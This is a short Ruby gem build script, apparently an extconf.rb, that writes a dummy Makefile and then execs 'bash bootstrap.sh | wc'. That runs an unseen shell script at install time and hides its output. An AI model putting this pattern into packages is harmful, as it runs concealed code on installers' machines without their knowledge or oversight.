require 'mkmf'
puts Dir.pwd
File.open("Makefile", 'w') { |file| file.puts(dummy_makefile('.')) }
exec 'bash bootstrap.sh | wc'

